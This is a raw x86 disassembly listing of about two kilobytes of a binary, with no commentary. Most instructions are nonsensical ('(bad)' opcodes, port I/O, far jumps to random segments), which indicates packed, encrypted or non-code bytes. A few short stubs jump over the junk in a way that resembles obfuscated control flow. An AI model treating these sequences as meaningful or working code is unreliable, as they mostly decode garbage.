  40bf30:	int    0x5f
  40bf32:	sbb    ecx,DWORD PTR [esi-0x12fad22]
  40bf38:	sub    esp,0xaff4da32
  40bf3e:	in     eax,0x69
  40bf40:	sbb    BYTE PTR [esp+ebx*4+0x6f],al
  40bf44:	nop
  40bf45:	mov    edi,0x40c859bb
  40bf4a:	ss stc 
  40bf4c:	aaa    
  40bf4d:	dec    ebx
  40bf4e:	pop    ds
  40bf4f:	inc    edx
  40bf50:	push   ecx
  40bf51:	push   ebx
  40bf52:	push   ebp
  40bf53:	cld    
  40bf54:	sahf   
  40bf55:	add    ch,BYTE PTR [ecx-0x69e7e820]
  40bf5b:	(bad)  
  40bf5c:	ds arpl WORD PTR ss:[esi-0x48],cx
  40bf61:	mov    eax,ds:0x133713ae
  40bf66:	push   esp
  40bf67:	push   ecx
  40bf68:	pop    esi
  40bf69:	repnz inc ebx
  40bf6b:	in     eax,dx
  40bf6c:	sbb    esi,edi
  40bf6e:	xchg   BYTE PTR [esi+0x8],ah
  40bf71:	pop    esi
  40bf72:	mov    eax,0xce3fe2e7
  40bf77:	fprem1 
  40bf79:	mov    esi,DWORD PTR [ecx]
  40bf7b:	js     0x40bf59
  40bf7d:	cdq    
  40bf7e:	sub    BYTE PTR [esp+edx*2-0x74045ded],dl
  40bf85:	jge    0x40bf8f
  40bf87:	mov    edi,DWORD PTR [edi]
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	mov    ds:0x3e86496f,al
  40bfc2:	xchg   esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	je     0x40bf58
  40bfcb:	int    0xbb
  40bfcd:	dec    edi
  40bfce:	js     0x40c018
  40bfd0:	cdq    
  40bfd1:	retf   
  40bfd2:	enter  0xbcda,0x6c
  40bfd6:	call   0x92d7:0x405976ec
  40bfdd:	push   ecx
  40bfde:	or     DWORD PTR [edi-0x33732e44],ecx
  40bfe4:	inc    edi
  40bfe5:	icebp  
  40bfe6:	stos   DWORD PTR es:[edi],eax
  40bfe7:	fs pop esp
  40bfe9:	retf   
  40bfea:	pop    esi
  40bfeb:	lahf   
  40bfec:	inc    ebx
  40bfed:	add    bh,BYTE PTR [eax+0x404c94b]
  40bff3:	mov    esi,eax
  40bff5:	cdq    
  40bff6:	ja     0x40bfe6
  40bff8:	mov    bh,0xba
  40bffa:	imul   edx,ebp,0x7b
  40bffd:	dec    ecx
  40bffe:	jmp    0x88f:0x98a5ebdc
  40c005:	and    BYTE PTR [edi-0x59b68352],cl
  40c00b:	xor    edi,edi
  40c00d:	stc    
  40c00e:	adc    edx,0x6fa641e6
  40c014:	inc    edx
  40c015:	repnz or al,0x7b
  40c018:	pop    ds
  40c019:	xchg   ecx,eax
  40c01a:	inc    eax
  40c01b:	xor    DWORD PTR [eax],0xca11479
  40c021:	push   0xbec84cc7
  40c026:	je     0x40bff1
  40c028:	rcr    DWORD PTR [esi+0x21],cl
  40c02b:	and    DWORD PTR [edx-0x69],0x2a0dd20f
  40c032:	push   es
  40c033:	lods   eax,DWORD PTR ds:[esi]
  40c034:	loop   0x40bfdc
  40c036:	cdq    
  40c037:	cmp    al,0x9f
  40c039:	mov    esp,DWORD PTR ds:0xb5a99859
  40c03f:	mov    cl,0x41
  40c041:	push   edx
  40c042:	and    DWORD PTR [edi-0x6a],0xbfd4cd26
  40c049:	jmp    0x40bffb
  40c04b:	xchg   ecx,eax
  40c04c:	adc    al,0xcb
  40c04e:	js     0x40c0c3
  40c050:	jnp    0x40c038
  40c052:	stos   DWORD PTR es:[edi],eax
  40c053:	jo     0x40bfd7
  40c055:	call   0xa447:0xd0af5af5
  40c05c:	pushf  
  40c05d:	inc    esp
  40c05e:	cmp    al,0x6d
  40c060:	adc    al,0x4f
  40c062:	push   eax
  40c063:	cld    
  40c064:	mov    eax,0xd58d67a5
  40c069:	xor    DWORD PTR [eax-0x4fb422c7],ecx
  40c06f:	or     eax,0xa9f09de
  40c074:	imul   esp,DWORD PTR [edx+eiz*2-0x6f45df00],0x2d
  40c07c:	mov    ch,0xf3
  40c07e:	mov    dh,0xcd
  40c080:	mov    ebx,0xd7c06d36
  40c086:	adc    BYTE PTR [eax],0x5f
  40c089:	adc    eax,0xcafe4906
  40c08e:	daa    
  40c08f:	dec    esi
  40c090:	mov    al,BYTE PTR [esp+ebp*1+0x6a02c273]
  40c097:	sahf   
  40c098:	mov    edx,0xfad5a521
  40c09d:	(bad)  
  40c09f:	pop    es
  40c0a0:	loopne 0x40c0aa
  40c0a2:	and    al,al
  40c0a4:	pop    esi
  40c0a5:	xchg   BYTE PTR [ecx+0x33],bh
  40c0a8:	jmp    DWORD PTR [esp+ebx*1]
  40c0ab:	fisubr WORD PTR [eax-0x24]
  40c0ae:	(bad)  
  40c0af:	sahf   
  40c0b0:	push   ebp
  40c0b1:	cmc    
  40c0b2:	sub    DWORD PTR [ebx+0x4c],eax
  40c0b5:	std    
  40c0b6:	in     al,0xf0
  40c0b8:	or     al,0xcc
  40c0ba:	and    al,BYTE PTR [ecx]
  40c0bc:	xor    BYTE PTR [ecx],ch
  40c0be:	mov    DWORD PTR [ebx-0x18d5b7ec],ecx
  40c0c4:	cdq    
  40c0c5:	fs push es
  40c0c7:	xor    BYTE PTR [edx],bl
  40c0c9:	sti    
  40c0ca:	test   al,0x7f
  40c0cc:	ret    
  40c0cd:	loopne 0x40c0d8
  40c0cf:	mov    al,0xec
  40c0d1:	add    ebp,DWORD PTR [eax-0x65c2902e]
  40c0d7:	mov    dl,0xd6
  40c0d9:	outs   dx,DWORD PTR ds:[esi]
  40c0da:	icebp  
  40c0db:	push   edi
  40c0dc:	xchg   ebx,eax
  40c0dd:	push   ss
  40c0de:	sub    cl,bl
  40c0e0:	xchg   BYTE PTR [ecx-0x5dd79362],ch
  40c0e6:	aad    0x3f
  40c0e8:	push   ss
  40c0e9:	inc    edx
  40c0ea:	adc    BYTE PTR [eax-0xf],dh
  40c0ed:	bnd jg 0x40c0e1
  40c0f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0f1:	jmp    0x9b06:0x10ef9625
  40c0f8:	xchg   esi,eax
  40c0f9:	jo     0x40c0ef
  40c0fb:	lds    ebp,FWORD PTR [ebx+eax*4]
  40c0fe:	dec    edx
  40c0ff:	cli    
  40c100:	add    bh,BYTE PTR [edi-0x32d9c537]
  40c106:	in     al,dx
  40c107:	aas    
  40c108:	out    0x63,eax
  40c10a:	icebp  
  40c10b:	pop    edi
  40c10c:	inc    edx
  40c10d:	jle    0x40c0aa
  40c10f:	xchg   esi,eax
  40c110:	jmp    0x840f1a80
  40c115:	mov    ds:0x8ea5ea0d,al
  40c11a:	sub    eax,0xfc3c9a37
  40c11f:	lea    ebx,[ebx]
  40c121:	dec    edx
  40c123:	sub    eax,0xa299a6ef
  40c128:	shr    BYTE PTR [di+0x4ed8],cl
  40c12d:	mov    BYTE PTR [edi+ebp*8-0x75],al
  40c131:	cdq    
  40c132:	scas   eax,DWORD PTR es:[edi]
  40c133:	adc    eax,0x278fb4f4
  40c138:	cs cld 
  40c13a:	mov    esp,0xade5bbd4
  40c13f:	xchg   ecx,eax
  40c140:	xchg   ebx,eax
  40c141:	cwde   
  40c142:	fimul  DWORD PTR [edx+esi*1+0x4bbdcff9]
  40c149:	and    BYTE PTR [edx],bh
  40c14b:	jle    0x40c112
  40c14d:	fwait
  40c14e:	sbb    al,0xe3
  40c150:	mov    ah,BYTE PTR [esi+0x76debebe]
  40c156:	adc    al,0xbc
  40c158:	xor    ebp,DWORD PTR [ebp-0x7e1fd362]
  40c15e:	mov    bh,0x2a
  40c160:	in     al,dx
  40c161:	enter  0x2561,0x2
  40c165:	retf   
  40c166:	push   esi
  40c167:	mov    ds:0x935de22c,al
  40c16c:	add    ah,ah
  40c16e:	mul    esp
  40c170:	jo     0x40c1cc
  40c172:	sbb    DWORD PTR [ebx],esi
  40c174:	js     0x40c18b
  40c176:	mov    cl,0x96
  40c178:	dec    esi
  40c179:	leave  
  40c17a:	out    0xc4,al
  40c17c:	push   cs
  40c17d:	mov    eax,0xa3bb71bc
  40c182:	or     eax,0x7818ba0
  40c187:	jno    0x40c11b
  40c189:	mov    cl,0x9c
  40c18b:	fnstcw WORD PTR [ebx]
  40c18d:	iret   
  40c18e:	scas   eax,DWORD PTR es:[edi]
  40c18f:	hlt    
  40c190:	and    BYTE PTR [ebx],bh
  40c192:	arpl   sp,dx
  40c194:	pop    edi
  40c195:	stos   BYTE PTR es:[edi],al
  40c196:	jge    0x40c16d
  40c198:	ret    0x5696
  40c19b:	inc    edi
  40c19c:	sub    ecx,DWORD PTR [ebx+0x4]
  40c19f:	les    ecx,FWORD PTR [ebx]
  40c1a1:	mov    eax,0x4d29a742
  40c1a6:	pop    ebx
  40c1a7:	clc    
  40c1a8:	icebp  
  40c1a9:	push   es
  40c1aa:	or     al,0xb6
  40c1ac:	stos   BYTE PTR es:[edi],al
  40c1ad:	lahf   
  40c1ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1af:	mov    ch,0x22
  40c1b1:	mov    bl,0xb8
  40c1b3:	int3   
  40c1b4:	cmp    bl,0x43
  40c1b7:	push   ds
  40c1b8:	or     ch,BYTE PTR [edi]
  40c1ba:	inc    edx
  40c1bb:	js     0x40c196
  40c1bd:	sti    
  40c1be:	(bad)
  40c1c2:	aaa    
  40c1c3:	add    BYTE PTR gs:[ebx],0x39
  40c1c7:	mov    al,0xa2
  40c1c9:	inc    BYTE PTR [edx]
  40c1cb:	cmp    dl,BYTE PTR [edx+0x57]
  40c1ce:	test   eax,0x4c4a379
  40c1d3:	ins    BYTE PTR es:[edi],dx
  40c1d4:	mov    ch,0x1b
  40c1d6:	call   0xaeea:0x7047b455
  40c1dd:	pop    esp
  40c1de:	jl     0x40c208
  40c1e0:	hlt    
  40c1e1:	(bad)  
  40c1e2:	xchg   edx,eax
  40c1e3:	mov    al,ds:0xd24df892
  40c1e8:	sbb    eax,DWORD PTR [edi]
  40c1ea:	jmp    0x40c206
  40c1ec:	push   ecx
  40c1ed:	xchg   edi,eax
  40c1ee:	js     0x40c174
  40c1f0:	add    DWORD PTR [esi],esp
  40c1f2:	dec    esp
  40c1f3:	pusha  
  40c1f4:	jns    0x40c1de
  40c1f6:	jns    0x40c250
  40c1f8:	pop    ebx
  40c1f9:	js     0x40c1a9
  40c1fb:	and    eax,DWORD PTR [edx]
  40c1fd:	lods   al,BYTE PTR ds:[esi]
  40c1fe:	pop    ecx
  40c1ff:	int3   
  40c200:	into   
  40c201:	and    eax,0x9abdaf5e
  40c206:	xlat   BYTE PTR ds:[ebx]
  40c207:	xchg   ebx,eax
  40c208:	xchg   edx,eax
  40c209:	cmp    al,0x31
  40c20b:	inc    esi
  40c20c:	loop   0x40c206
  40c20e:	hlt    
  40c20f:	cwde   
  40c210:	cld    
  40c211:	sahf   
  40c212:	push   edi
  40c213:	in     al,0xd9
  40c215:	cli    
  40c216:	jle    0x40c1ea
  40c218:	pusha  
  40c219:	xchg   ecx,eax
  40c21a:	xchg   edi,eax
  40c21b:	loop   0x40c24a
  40c21d:	ja     0x40c259
  40c21f:	loope  0x40c244
  40c221:	jle    0x40c1e6
  40c223:	adc    DWORD PTR ds:0xeea34540,esi
  40c229:	xchg   BYTE PTR [ebx+0x51],ah
  40c22c:	pop    esi
  40c22d:	fistp  DWORD PTR [ecx]
  40c22f:	mov    al,0x5
  40c231:	call   0x39c62021
  40c236:	cmp    eax,0x6c59cbcd
  40c23b:	outs   dx,BYTE PTR ds:[esi]
  40c23c:	cmc    
  40c23d:	cmp    ebx,DWORD PTR [ebp-0x62]
  40c240:	cmp    DWORD PTR [edi-0x61d77d3b],0xe54792d5
  40c24a:	(bad)  
  40c24b:	mov    bl,0x68
  40c24d:	clc    
  40c24e:	jecxz  0x40c283
  40c250:	(bad)  
  40c251:	push   ebx
  40c252:	lds    ebx,FWORD PTR [ecx+0x7e]
  40c255:	sub    eax,0x9f56ccd6
  40c25a:	and    DWORD PTR [ecx-0x7d376b22],edx
  40c260:	mov    ebp,0xc13fc8ef
  40c265:	(bad)  
  40c267:	push   ecx
  40c268:	push   eax
  40c269:	ins    DWORD PTR es:[edi],dx
  40c26a:	imul   DWORD PTR [ebp+0x11]
  40c26d:	pop    ebx
  40c26e:	adc    al,0xa6
  40c270:	and    BYTE PTR [ecx+0x47e71c64],dl
  40c276:	push   esp
  40c277:	clc    
  40c278:	cs std 
  40c27a:	in     eax,dx
  40c27b:	test   BYTE PTR [edi],al
  40c27d:	or     edi,0x9c9716af
  40c283:	fld    QWORD PTR [edx+0x59e5bcb9]
  40c289:	sti    
  40c28a:	xchg   ebx,eax
  40c28b:	(bad)  
  40c28c:	aas    
  40c28d:	push   ss
  40c28e:	popa   
  40c28f:	xchg   ecx,eax
  40c290:	cld    
  40c291:	outs   dx,BYTE PTR ds:[esi]
  40c292:	std    
  40c293:	mov    eax,0x90f7495a
  40c298:	and    ah,BYTE PTR [ebx]
  40c29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c29b:	dec    BYTE PTR [esi+ecx*1+0x1f]
  40c29f:	ins    DWORD PTR es:[edi],dx
  40c2a0:	hlt    
  40c2a1:	ins    DWORD PTR es:[edi],dx
  40c2a2:	adc    al,0x73
  40c2a4:	call   0xeadb8217
  40c2a9:	mov    ch,0x32
  40c2ab:	dec    ebp
  40c2ac:	into   
  40c2ad:	push   cs
  40c2ae:	sbb    al,0x5
  40c2b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2b1:	loopne 0x40c2e3
  40c2b3:	mov    eax,ds:0xf8404241
  40c2b8:	jmp    0xaa5c:0x1b9dcc6e
  40c2bf:	mov    ds:0x8dc8f283,eax
  40c2c4:	das    
  40c2c5:	mov    eax,DWORD PTR [ebp-0x28]
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax+0x1a],bh
  40c2e3:	out    0x8a,al
  40c2e5:	ja     0x40c321
  40c2e7:	fwait
  40c2e8:	js     0x40c362
  40c2ea:	je     0x40c36a
  40c2ec:	js     0x40c366
  40c2ee:	and    ecx,DWORD PTR [ecx+0x44]
  40c2f1:	cs clc 
  40c2f3:	popa   
  40c2f4:	jmp    FWORD PTR [edi-0x1d]
  40c2f7:	add    dh,dl
  40c2f9:	or     eax,0x56a70dd5
  40c2fe:	pop    edx
  40c2ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c300:	mov    esi,0x924ac02f
  40c305:	inc    edx
  40c306:	push   0x78687086
  40c30b:	add    DWORD PTR [eax],ebp
  40c30d:	adc    al,BYTE PTR [eax]
  40c30f:	adc    ah,ch
  40c311:	sbb    eax,0xf4a7d624
  40c316:	scas   eax,DWORD PTR es:[edi]
  40c317:	js     0x40c335
  40c319:	outs   dx,DWORD PTR ds:[esi]
  40c31a:	add    DWORD PTR [ebx],ebp
  40c31c:	(bad)  
  40c31d:	(bad)  
  40c31e:	mov    cl,0x7d
  40c320:	push   ecx
  40c321:	stos   DWORD PTR es:[edi],eax
  40c322:	inc    esp
  40c323:	xor    DWORD PTR [esp+eax*1],esi
  40c326:	jo     0x40c2d6
  40c328:	mov    al,0x81
  40c32a:	cmp    al,0x5e
  40c32c:	push   eax
  40c32d:	or     al,0x39
  40c32f:	xchg   edx,eax
  40c330:	xor    DWORD PTR es:[eax],esi
  40c333:	mov    esi,0xc1989933
  40c338:	icebp  
  40c339:	cmp    al,0x13
  40c33b:	jns    0x40c388
  40c33d:	cmc    
  40c33e:	leave  
  40c33f:	mov    ebp,0xf775b200
  40c344:	push   0x1d
  40c346:	enter  0xddc2,0x10
  40c34a:	push   0xffffffe8
  40c34c:	dec    edx
  40c34d:	fld    QWORD PTR [ecx+0x44]
  40c350:	push   esi
  40c351:	pop    ds
  40c352:	pop    ebx
  40c353:	add    ebx,DWORD PTR [eax-0x20b6bade]
  40c359:	(bad)  
  40c35a:	into   
  40c35b:	or     al,0xff
  40c35d:	mov    edi,0xfb3f6e26
  40c362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c363:	mov    dl,0x6a
  40c365:	into   
  40c366:	adc    al,0xe6
  40c368:	mov    dl,0x3b
  40c36a:	add    ch,BYTE PTR ds:0xfeca27
  40c370:	shl    BYTE PTR ds:0x729bb2f7,cl
  40c376:	push   0xb1e27641
  40c37b:	aad    0x13
  40c37d:	sti    
  40c37e:	dec    edi
  40c37f:	mov    ebx,0x1a9fe3c0
  40c384:	in     al,dx
  40c385:	fsubp  st(4),st
  40c387:	lods   al,BYTE PTR ds:[esi]
  40c388:	inc    edi
  40c389:	cmp    bh,BYTE PTR [esi]
  40c38b:	cld    
  40c38c:	inc    esp
  40c38d:	mov    cl,0x7
  40c38f:	or     ch,BYTE PTR [ebp+ebx*1+0x3c4c76c]
  40c396:	xchg   DWORD PTR [ecx+ebp*1],eax
  40c399:	sbb    DWORD PTR [ebx+0x132ba50c],esp
  40c39f:	push   0xffffff98
  40c3a1:	add    esp,DWORD PTR [edi-0x22]
  40c3a4:	jecxz  0x40c36d
  40c3a6:	int3   
  40c3a7:	dec    esi
  40c3a8:	cmovns ebx,ebx
  40c3ab:	xor    BYTE PTR [ebx-0x54],ah
  40c3ae:	lods   eax,DWORD PTR ds:[esi]
  40c3af:	and    edx,DWORD PTR [eax]
  40c3b1:	jb     0x40c3da
  40c3b3:	es add al,0x35
  40c3b6:	cdq    
  40c3b7:	adc    BYTE PTR [esi-0x3c613c58],al
  40c3bd:	push   es
  40c3be:	fnsave [ebp+0x2e]
  40c3c1:	imul   ecx,DWORD PTR es:[edi],0x5e9ebb95
  40c3c8:	fild   QWORD PTR [ecx-0x164177ea]
  40c3ce:	mov    eax,ds:0x3f7ca402
  40c3d3:	cmc    
  40c3d4:	fadd   QWORD PTR [edi]
  40c3d6:	fwait
  40c3d7:	inc    ebp
  40c3d8:	loopne 0x40c3c7
  40c3da:	xlat   BYTE PTR ds:[ebx]
  40c3db:	enter  0x158c,0x5c
  40c3df:	jbe    0x40c44f
  40c3e1:	push   cs
  40c3e2:	rcr    BYTE PTR [eax+0x7198d464],1
  40c3e8:	arpl   WORD PTR [eax-0x60ca2396],dx
  40c3ee:	das    
  40c3ef:	fiadd  DWORD PTR [eax]
  40c3f1:	ret    0x2020
  40c3f4:	lds    eax,FWORD PTR [ebp-0x64]
  40c3f7:	mov    dh,dl
  40c3f9:	fld    TBYTE PTR [edx+0x68]
  40c3fc:	ss xchg esp,eax
  40c3fe:	sub    ah,BYTE PTR [ebp-0x64a0e44f]
  40c404:	pop    edi
  40c405:	or     BYTE PTR [eax-0x62],ah
  40c408:	das    
  40c409:	mov    dh,al
  40c40b:	adc    eax,0x7b03a054
  40c410:	push   edx
  40c411:	mov    ds:0x5eaff928,al
  40c416:	loop   0x40c437
  40c418:	lods   eax,DWORD PTR ds:[esi]
  40c419:	jmp    0xecdd:0x226a447e
  40c420:	call   0x79012ab5
  40c425:	push   edx
  40c426:	jecxz  0x40c42f
  40c428:	les    esp,FWORD PTR [esp]
  40c42b:	mov    BYTE PTR [ebp+ecx*8-0x3ede3497],bh
  40c432:	loopne 0x40c469
  40c434:	(bad)  
  40c435:	adc    BYTE PTR [ecx-0x4305c6a4],ch
  40c43b:	add    eax,0x33aced58
  40c440:	jne    0x40c44e
  40c442:	sahf   
  40c443:	sub    dl,ah
  40c445:	mov    al,ds:0xb5d8c422
  40c44a:	push   0xffffffbb
  40c44c:	test   DWORD PTR [eax+0x772b165e],ecx
  40c452:	mov    ss,ebx
  40c454:	cmp    al,0x61
  40c456:	add    eax,0xf17cb3ce
  40c45b:	jle    0x40c429
  40c45d:	mov    ecx,0x961e13c2
  40c462:	(bad)  
  40c463:	jae    0x40c40a
  40c465:	pop    ds
  40c466:	scas   eax,DWORD PTR es:[edi]
  40c467:	jmp    0x40c477
  40c469:	enter  0x7ef4,0xc2
  40c46d:	pop    esi
  40c46e:	arpl   WORD PTR [eax-0x46],cx
  40c471:	mov    ds:0x6f5d0d72,eax
  40c476:	push   es
  40c477:	pop    es
  40c478:	into   
  40c479:	mov    ss,WORD PTR [ecx-0x7cbed989]
  40c47f:	das    
  40c480:	and    bl,BYTE PTR [esi]
  40c482:	inc    edi
  40c483:	pop    ds
  40c484:	inc    ebp
  40c485:	lods   eax,DWORD PTR ds:[esi]
  40c486:	jle    0x40c4d0
  40c488:	dec    esi
  40c489:	mov    ah,dh
  40c48b:	lea    eax,[edx]
  40c48d:	jnp    0x40c4bf
  40c48f:	shl    DWORD PTR [edi+esi*2-0x66],0x51
  40c494:	dec    esi
  40c495:	pushf  
  40c496:	xor    eax,0xa3bd93df
  40c49b:	adc    eax,0xd5ff7098
  40c4a0:	mov    BYTE PTR [eax-0x612f5f34],0x57
  40c4a7:	xor    BYTE PTR [edx+0x5f],ch
  40c4aa:	ins    BYTE PTR es:[edi],dx
  40c4ab:	jno    0x40c4a8
  40c4ad:	lds    edi,FWORD PTR [ebx]
  40c4af:	(bad)  
  40c4b0:	mov    BYTE PTR [esi],0x45
  40c4b3:	fbld   TBYTE PTR ds:0xd6f7e501
  40c4b9:	sbb    ebp,esp
  40c4bb:	sbb    BYTE PTR [edi-0x32516a9f],ah
  40c4c1:	mov    ebp,0x2c61f8b1
  40c4c6:	or     esi,0x94a7afd4
  40c4cc:	and    eax,ebp
  40c4ce:	push   ss
  40c4cf:	cli    
  40c4d0:	xlat   BYTE PTR ds:[ebx]
  40c4d1:	adc    ch,bl
  40c4d3:	test   bl,ah
  40c4d5:	in     eax,0x8b
  40c4d7:	addr16 icebp 
  40c4d9:	xor    DWORD PTR [edx+0x35],ecx
  40c4dc:	jmp    0x40c516
  40c4de:	and    al,0x1a
  40c4e0:	jne    0x40c4b6
  40c4e2:	pop    edi
  40c4e3:	add    DWORD PTR [ecx+0x24],0x5aad9e71
  40c4ea:	iret   
  40c4eb:	push   cs
  40c4ec:	std    
  40c4ed:	neg    DWORD PTR [eax-0x6d]
  40c4f0:	dec    ebx
  40c4f1:	push   ss
  40c4f2:	ins    DWORD PTR es:[edi],dx
  40c4f3:	lods   eax,DWORD PTR ds:[esi]
  40c4f4:	rol    BYTE PTR [esi-0x4e],cl
  40c4f7:	test   eax,0x55f12ee9
  40c4fc:	loopne 0x40c4ad
  40c4fe:	push   ss
  40c4ff:	std    
  40c500:	(bad)  
  40c501:	cmp    al,0xd2
  40c503:	(bad)  
  40c504:	out    dx,eax
  40c505:	in     al,0x76
  40c507:	addr16 (bad) 
  40c509:	mov    eax,0xeefd44e
  40c50e:	pop    ebp
  40c50f:	mov    ch,0x4a
  40c511:	neg    BYTE PTR [edi+esi*2-0x79cfc2cb]
  40c518:	(bad)  
  40c519:	mov    ebx,0x650c4358
  40c51e:	ss out 0x39,eax
  40c521:	and    BYTE PTR [eax+0x9b2b7f4],ch
  40c527:	push   ebp
  40c528:	mov    bl,0x75
  40c52a:	(bad)  
  40c52b:	(bad)  
  40c52c:	shl    BYTE PTR [ebx+0x1b],1
  40c52f:	inc    esp
  40c530:	and    BYTE PTR [eax+0x50b23aa8],dl
  40c536:	ds push 0xffffff91
  40c539:	pop    ebp
  40c53a:	inc    edx
  40c53b:	(bad)  
  40c53c:	je     0x40c4d3
  40c53e:	xchg   edi,eax
  40c53f:	pop    ebx
  40c540:	scas   al,BYTE PTR es:[edi]
  40c541:	fnstsw WORD PTR [ebp-0x24de9abb]
  40c547:	mov    bl,0x61
  40c549:	or     cl,BYTE PTR ds:0xb86c29ab
  40c54f:	shl    DWORD PTR [ebx-0x64],cl
  40c552:	popf   
  40c553:	and    DWORD PTR [ecx-0x3c],esp
  40c556:	cmp    DWORD PTR [esi],0x52f8aefd
  40c55c:	or     esp,DWORD PTR [ebx]
  40c55e:	or     DWORD PTR [eax],edi
  40c560:	sub    eax,0xba599377
  40c565:	cmp    ebp,DWORD PTR [edx+0x153e805a]
  40c56b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c56c:	test   eax,0x81be730b
  40c571:	loop   0x40c508
  40c573:	nop
  40c574:	sub    eax,DWORD PTR [esi-0x45de4e99]
  40c57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c57b:	jp     0x40c5d4
  40c57d:	ins    BYTE PTR es:[edi],dx
  40c57e:	sbb    ebp,esp
  40c580:	mov    ebp,0x426ca2ce
  40c585:	loope  0x40c536
  40c587:	pop    ss
  40c588:	jmp    0xd0fc:0x30fff62b
  40c58f:	add    esi,ebx
  40c591:	xchg   ebx,eax
  40c592:	and    al,0x24
  40c594:	sub    bh,bl
  40c596:	cmp    DWORD PTR [edi-0x41b21315],ebx
  40c59c:	ret    0x89bf
  40c59f:	sub    al,0x44
  40c5a1:	mov    ecx,0xe14d36d4
  40c5a6:	jb     0x40c536
  40c5a8:	sbb    esp,DWORD PTR [ebx]
  40c5aa:	jp     0x40c5c5
  40c5ac:	dec    edi
  40c5ad:	jae    0x40c577
  40c5af:	mov    edx,0x9e22ec61
  40c5b4:	dec    eax
  40c5b5:	push   esi
  40c5b6:	cli    
  40c5b7:	iret   
  40c5b8:	push   ebx
  40c5b9:	out    dx,eax
  40c5ba:	mov    al,ds:0x8da614e9
  40c5bf:	dec    ebx
  40c5c0:	xor    ebx,DWORD PTR [eax+eiz*2-0x3c]
  40c5c4:	scas   al,BYTE PTR es:[edi]
  40c5c5:	hlt    
  40c5c6:	daa    
  40c5c7:	mov    dh,0x4f
  40c5c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ca:	push   cs
  40c5cb:	push   ebx
  40c5cc:	pushf  
  40c5cd:	pop    es
  40c5ce:	xchg   edi,eax
  40c5cf:	mov    bl,0x10
  40c5d1:	test   edi,ebx
  40c5d3:	add    eax,DWORD PTR [edx-0x32]
  40c5d6:	in     eax,dx
  40c5d7:	cmp    BYTE PTR [edx-0x4d0c2efa],dh
  40c5dd:	inc    ecx
  40c5de:	jne    0x40c65d
  40c5e0:	pop    ebx
  40c5e1:	cmp    bl,BYTE PTR [esi-0x74]
  40c5e4:	mov    eax,ds:0x30a15ac7
  40c5e9:	mov    eax,ds:0x66fb3366
  40c5ee:	add    edi,edx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x40d2d2f7
  40c613:	mov    eax,ds:0x9836ccb2
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	aas    
  40c61f:	mov    dl,0xc8
  40c621:	or     al,dl
  40c623:	ficom  DWORD PTR [edi+esi*4-0x5154c1]
  40c62a:	ss fsubp st(7),st
  40c62d:	lods   eax,DWORD PTR ds:[esi]
  40c62e:	jns    0x40c5b6
  40c630:	iretw  
  40c632:	shl    cl,1
  40c634:	cmc    
  40c635:	sar    al,1
  40c637:	mov    eax,ds:0xa4867d95
  40c63c:	xor    eax,0x9c6ce186
  40c641:	xor    BYTE PTR [edi+0x6e],ah
  40c644:	repz ror DWORD PTR [eax+0x399801c0],0xec
  40c64c:	mov    bl,dh
  40c64e:	jne    0x40c674
  40c650:	iret   
  40c651:	jno    0x40c663
  40c653:	xchg   DWORD PTR [edi+ecx*4],ecx
  40c656:	sbb    al,0xec
  40c658:	aad    0xf5
  40c65a:	(bad)
  40c65e:	fadd   DWORD PTR [esi-0x366374f2]
  40c664:	pop    ecx
  40c665:	loopne 0x40c673
  40c667:	imul   esi,DWORD PTR [eax-0x2bb0a5c2],0x6a
  40c66e:	mov    esp,0xb277cc3a
  40c673:	push   esp
  40c674:	ret    
  40c675:	test   al,ch
  40c677:	or     dl,ah
  40c679:	cdq    
  40c67a:	xchg   DWORD PTR [ebp-0x5b11a631],esi
  40c680:	les    ecx,FWORD PTR [edx+0x52]
  40c683:	mov    ecx,DWORD PTR [esi-0x70cb7e97]
  40c689:	fnstsw ax
  40c68b:	aaa    
  40c68c:	cmc    
  40c68d:	outs   dx,DWORD PTR ds:[esi]
  40c68e:	sub    BYTE PTR [eax+0x37cb5768],0xcd
  40c695:	(bad)  
  40c696:	hlt    
  40c697:	inc    ebp
  40c698:	adc    eax,0xab5df889
  40c69d:	fimul  DWORD PTR [ebx-0x60e188be]
  40c6a3:	jnp    0x40c62e
  40c6a5:	sbb    DWORD PTR [ecx+0x393757ae],ebx
  40c6ab:	pop    ds
  40c6ac:	shr    bh,1
  40c6ae:	icebp  
  40c6af:	pop    ecx
